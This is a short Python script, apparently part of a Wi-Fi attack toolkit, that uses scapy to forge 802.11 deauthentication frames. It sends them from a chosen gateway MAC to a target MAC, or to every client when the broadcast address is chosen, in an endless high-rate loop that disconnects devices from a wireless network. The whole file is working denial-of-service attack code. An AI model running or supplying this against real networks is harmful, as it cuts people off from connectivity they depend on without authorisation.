#!/bin/python3

from scapy.all import (
    RadioTap,  # Adds additional metadata to an 802.11 frame
    Dot11,  # For creating 802.11 frame
    Dot11Deauth,  # For creating deauth frame
    sendp,  # for sending packets
)
import sys
import os
from colorama import Fore, Back, Style


def deauth(target_mac, gateway_mac, iface, default_iface="wlan0"):
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC

    count = 0
    inter = 0.00001

    # If not sudo, don't allow to continue
    if not "SUDO_UID" in os.environ.keys():
        print(
            f"[{Fore.RED}!{Style.RESET_ALL}] Permission error: {Fore.RED}You need root privileges for this feature.{Style.RESET_ALL}"
        )
        sys.exit()

    try:
        if count == 0:
            # If count is equal to 0, do endless loop
            loop = 1
            count = None
        else:
            loop = 0

        if target_mac.lower() == "a":
            target_mac = "ff:ff:ff:ff:ff:ff"

        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

        if default_iface != "":
            iface = default_iface

        choice = input(
            f"[{Fore.GREEN}+{Style.RESET_ALL}] Target MAC: {Fore.GREEN}{target_mac}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Gateway MAC: {Fore.GREEN}{gateway_mac}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Interface: {Fore.GREEN}{iface}{Style.RESET_ALL}\nDo you wish to continue? [Y/N]: "
        )

        if choice.lower() == "y":

            if count:
                print(
                    f"[{Fore.YELLOW}?{Style.RESET_ALL}] Sending {count} frames every {inter}s..."
                )
            else:
                print(
                    f"[{Fore.YELLOW}?{Style.RESET_ALL}] Sending frames every {inter}s until CTRL-C is pressed..."
                )

            # Stack them up
            packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
            # Send the packet
            sendp(packet, count=count, loop=1, iface=iface, verbose=0)

        else:
            print("Operation was cancelled.")
            sys.exit("\n")

    except Exception as e:
        print(f"[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        sys.exit()
